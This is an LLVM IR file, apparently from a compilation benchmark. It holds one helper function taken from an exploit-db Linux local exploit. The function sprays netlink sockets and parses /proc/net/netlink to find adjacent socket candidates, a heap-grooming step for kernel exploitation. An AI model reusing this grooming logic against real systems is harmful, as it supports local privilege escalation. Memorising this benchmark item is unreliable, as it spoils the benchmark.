; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_45553.c_find_netlink_candidates.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_45553.c_find_netlink_candidates.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sock_pid = type { i32, i32 }

@MAX_SOCK_PID_SPRAY = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [38 x i8] c"[-] failed to create a new candidate\0A\00", align 1
@.str.1 = private unnamed_addr constant [27 x i8] c"[+] %d candidates created\0A\00", align 1
@NETLINK_USERSOCK = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [41 x i8] c"[-] failed to parse '/proc/net/netlink'\0A\00", align 1
@.str.3 = private unnamed_addr constant [42 x i8] c"[+] parsing '/proc/net/netlink' complete\0A\00", align 1
@.str.4 = private unnamed_addr constant [32 x i8] c"[+] adjacent candidates found!\0A\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (i32 (%struct.sock_pid*, %struct.sock_pid*)* @find_netlink_candidates to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @find_netlink_candidates(%struct.sock_pid* %0, %struct.sock_pid* %1) #0 {
  %3 = alloca %struct.sock_pid*, align 8
  %4 = alloca %struct.sock_pid*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i64, align 8
  %7 = alloca i32*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store %struct.sock_pid* %0, %struct.sock_pid** %3, align 8
  store %struct.sock_pid* %1, %struct.sock_pid** %4, align 8
  %13 = load i32, i32* @MAX_SOCK_PID_SPRAY, align 4
  %14 = zext i32 %13 to i64
  %15 = call i8* @llvm.stacksave()
  store i8* %15, i8** %5, align 8
  %16 = alloca %struct.sock_pid, i64 %14, align 16
  store i64 %14, i64* %6, align 8
  store i32* null, i32** %7, align 8
  store i32 -1, i32* %12, align 4
  %17 = load %struct.sock_pid*, %struct.sock_pid** %3, align 8
  %18 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %17, i32 0, i32 0
  store i32 -1, i32* %18, align 4
  %19 = load %struct.sock_pid*, %struct.sock_pid** %4, align 8
  %20 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %19, i32 0, i32 0
  store i32 -1, i32* %20, align 4
  store i32 0, i32* %9, align 4
  br label %21

21:                                               ; preds = %34, %2
  %22 = load i32, i32* %9, align 4
  %23 = load i32, i32* @MAX_SOCK_PID_SPRAY, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %37

25:                                               ; preds = %21
  %26 = load i32, i32* %9, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %16, i64 %27
  %29 = call i64 @create_netlink_candidate(%struct.sock_pid* %28)
  %30 = icmp ne i64 %29, 0
  br i1 %30, label %31, label %33

31:                                               ; preds = %25
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str, i64 0, i64 0))
  br label %138

33:                                               ; preds = %25
  br label %34

34:                                               ; preds = %33
  %35 = load i32, i32* %9, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %9, align 4
  br label %21

37:                                               ; preds = %21
  %38 = load i32, i32* @MAX_SOCK_PID_SPRAY, align 4
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0), i32 %38)
  %40 = load i32, i32* @NETLINK_USERSOCK, align 4
  %41 = call i64 @parse_proc_net_netlink(i32** %7, i64* %8, i32 %40)
  %42 = icmp ne i64 %41, 0
  br i1 %42, label %43, label %45

43:                                               ; preds = %37
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.2, i64 0, i64 0))
  br label %130

45:                                               ; preds = %37
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.3, i64 0, i64 0))
  %47 = load i64, i64* %8, align 8
  %48 = trunc i64 %47 to i32
  store i32 %48, i32* %9, align 4
  br label %49

49:                                               ; preds = %122, %45
  %50 = load i32, i32* %9, align 4
  %51 = add nsw i32 %50, -1
  store i32 %51, i32* %9, align 4
  %52 = icmp sgt i32 %51, 0
  br i1 %52, label %53, label %127

53:                                               ; preds = %49
  %54 = load i32*, i32** %7, align 8
  %55 = load i32, i32* %9, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds i32, i32* %54, i64 %56
  %58 = load i32, i32* %57, align 4
  %59 = load %struct.sock_pid*, %struct.sock_pid** %4, align 8
  %60 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %59, i32 0, i32 1
  store i32 %58, i32* %60, align 4
  %61 = load i32*, i32** %7, align 8
  %62 = load i32, i32* %9, align 4
  %63 = sub nsw i32 %62, 1
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i32, i32* %61, i64 %64
  %66 = load i32, i32* %65, align 4
  %67 = load %struct.sock_pid*, %struct.sock_pid** %3, align 8
  %68 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %67, i32 0, i32 1
  store i32 %66, i32* %68, align 4
  store i32 0, i32* %11, align 4
  store i32 0, i32* %10, align 4
  br label %69

69:                                               ; preds = %119, %53
  %70 = load i32, i32* %10, align 4
  %71 = load i32, i32* @MAX_SOCK_PID_SPRAY, align 4
  %72 = icmp slt i32 %70, %71
  br i1 %72, label %73, label %122

73:                                               ; preds = %69
  %74 = load i32, i32* %10, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %16, i64 %75
  %77 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %76, i32 0, i32 1
  %78 = load i32, i32* %77, align 4
  %79 = load %struct.sock_pid*, %struct.sock_pid** %4, align 8
  %80 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %79, i32 0, i32 1
  %81 = load i32, i32* %80, align 4
  %82 = icmp eq i32 %78, %81
  br i1 %82, label %83, label %93

83:                                               ; preds = %73
  %84 = load i32, i32* %10, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %16, i64 %85
  %87 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = load %struct.sock_pid*, %struct.sock_pid** %4, align 8
  %90 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %89, i32 0, i32 0
  store i32 %88, i32* %90, align 4
  %91 = load i32, i32* %11, align 4
  %92 = add nsw i32 %91, 1
  store i32 %92, i32* %11, align 4
  br label %114

93:                                               ; preds = %73
  %94 = load i32, i32* %10, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %16, i64 %95
  %97 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %96, i32 0, i32 1
  %98 = load i32, i32* %97, align 4
  %99 = load %struct.sock_pid*, %struct.sock_pid** %3, align 8
  %100 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %99, i32 0, i32 1
  %101 = load i32, i32* %100, align 4
  %102 = icmp eq i32 %98, %101
  br i1 %102, label %103, label %113

103:                                              ; preds = %93
  %104 = load i32, i32* %10, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %16, i64 %105
  %107 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %106, i32 0, i32 0
  %108 = load i32, i32* %107, align 8
  %109 = load %struct.sock_pid*, %struct.sock_pid** %3, align 8
  %110 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %109, i32 0, i32 0
  store i32 %108, i32* %110, align 4
  %111 = load i32, i32* %11, align 4
  %112 = add nsw i32 %111, 1
  store i32 %112, i32* %11, align 4
  br label %113

113:                                              ; preds = %103, %93
  br label %114

114:                                              ; preds = %113, %83
  %115 = load i32, i32* %11, align 4
  %116 = icmp eq i32 %115, 2
  br i1 %116, label %117, label %118

117:                                              ; preds = %114
  br label %128

118:                                              ; preds = %114
  br label %119

119:                                              ; preds = %118
  %120 = load i32, i32* %10, align 4
  %121 = add nsw i32 %120, 1
  store i32 %121, i32* %10, align 4
  br label %69

122:                                              ; preds = %69
  %123 = load %struct.sock_pid*, %struct.sock_pid** %4, align 8
  %124 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %123, i32 0, i32 0
  store i32 -1, i32* %124, align 4
  %125 = load %struct.sock_pid*, %struct.sock_pid** %3, align 8
  %126 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %125, i32 0, i32 0
  store i32 -1, i32* %126, align 4
  br label %49

127:                                              ; preds = %49
  br label %130

128:                                              ; preds = %117
  %129 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %12, align 4
  br label %130

130:                                              ; preds = %128, %127, %43
  %131 = load i32, i32* @MAX_SOCK_PID_SPRAY, align 4
  store i32 %131, i32* %9, align 4
  %132 = load i32*, i32** %7, align 8
  %133 = icmp ne i32* %132, null
  br i1 %133, label %134, label %137

134:                                              ; preds = %130
  %135 = load i32*, i32** %7, align 8
  %136 = call i32 @free(i32* %135)
  br label %137

137:                                              ; preds = %134, %130
  br label %138

138:                                              ; preds = %137, %31
  br label %139

139:                                              ; preds = %170, %138
  %140 = load i32, i32* %9, align 4
  %141 = add nsw i32 %140, -1
  store i32 %141, i32* %9, align 4
  %142 = icmp sge i32 %141, 0
  br i1 %142, label %143, label %171

143:                                              ; preds = %139
  %144 = load i32, i32* %9, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %16, i64 %145
  %147 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %146, i32 0, i32 0
  %148 = load i32, i32* %147, align 8
  %149 = load %struct.sock_pid*, %struct.sock_pid** %3, align 8
  %150 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %149, i32 0, i32 0
  %151 = load i32, i32* %150, align 4
  %152 = icmp ne i32 %148, %151
  br i1 %152, label %153, label %170

153:                                              ; preds = %143
  %154 = load i32, i32* %9, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %16, i64 %155
  %157 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = load %struct.sock_pid*, %struct.sock_pid** %4, align 8
  %160 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %159, i32 0, i32 0
  %161 = load i32, i32* %160, align 4
  %162 = icmp ne i32 %158, %161
  br i1 %162, label %163, label %170

163:                                              ; preds = %153
  %164 = load i32, i32* %9, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %16, i64 %165
  %167 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %166, i32 0, i32 0
  %168 = load i32, i32* %167, align 8
  %169 = call i32 @close(i32 %168)
  br label %170

170:                                              ; preds = %163, %153, %143
  br label %139

171:                                              ; preds = %139
  %172 = load i32, i32* %12, align 4
  %173 = load i8*, i8** %5, align 8
  call void @llvm.stackrestore(i8* %173)
  ret i32 %172
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i64 @create_netlink_candidate(%struct.sock_pid*) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i64 @parse_proc_net_netlink(i32**, i64*, i32) #2

declare dso_local i32 @free(i32*) #2

declare dso_local i32 @close(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
